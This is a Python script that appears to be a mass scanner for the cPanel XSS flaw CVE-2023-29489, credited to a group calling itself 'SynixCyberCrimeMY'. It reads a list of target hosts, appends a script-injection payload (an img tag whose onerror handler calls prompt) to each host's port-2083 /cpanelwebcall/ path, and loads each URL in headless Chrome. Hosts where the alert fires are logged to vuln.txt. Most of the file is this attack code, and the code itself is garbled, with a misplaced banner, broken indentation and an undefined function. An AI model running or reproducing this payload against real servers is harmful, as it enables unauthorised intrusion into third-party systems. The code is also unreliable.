import requests, sys, os, colorama, time, ctypes, datetime, sys, platform, getpass, urllib3, concurrent.futures
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from colorama import Fore, Back, Style
from datetime import date
from time import gmtime, strftime
from sys import stdout
from colorama import Fore, init
from colorama import *
import multiprocessing
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

def check_url(url):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    driver = webdriver.Chrome(options=chrome_options)

if not os.path.exists('Results'):
    os.mkdir('Results')


def banners():


	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')

print(f"""{Style.BRIGHT + Fore.YELLOW}

 (                       *         )  
 )\ )   (      (       (  `     ( /(  
(()/(   )\     )\      )\))(    )\()) 
 /(_))(((_)  (((_)    ((_)()\  ((_)\  
(_))  )\___  )\___    (_()((_)__ ((_)    SynixCyberCrimeMY Private CVE-2023-29489 Scanner
/ __|((/ __|((/ __|   |  \/  |\ \ / /       Made By SamuraiMelayu1337 & ?/h4zzzzz.scc
\__ \ | (__  | (__  _ | |\/| | \ V /            Using pip3 install -r requirements.txt
|___/  \___|  \___|(_)|_|  |_|  |_|   
                                      
""")

 try:
        driver.get(url)
        driver.implicitly_wait(5)
        alert = driver.switch_to.alert
        if alert.text == "StruckedBySynixCyberCrimeMY":
            with open("vuln.txt", "a") as f:
                f.write(url + "\n")
                print(f"[ CVE-2023-29489 ] - ROCKET LAUNCHED! >> {url}")
        else:
            print(f"[ CVE-2023-29489 ] - ROCKET FAILED TO LAUNCHED! >> {url}")
    except Exception as e:
        print(f"[ CVE-2023-29489 ] - UNKNOWN ERROR! >> {url}")
    finally:
        driver.quit()

if __name__ == "__main__":
    with open("url.txt", "r") as f:
        urls = f.read().splitlines()

    processed_urls = [f"https://{url}:2083/cpanelwebcall/<img%20src=x%20onerror='prompt(`StruckedBySynixCyberCrimeMY`)'>aaaaaaaaaaaa" for url in urls]
    
    pool = multiprocessing.Pool(processes=5)
    pool.map(check_url, processed_urls)
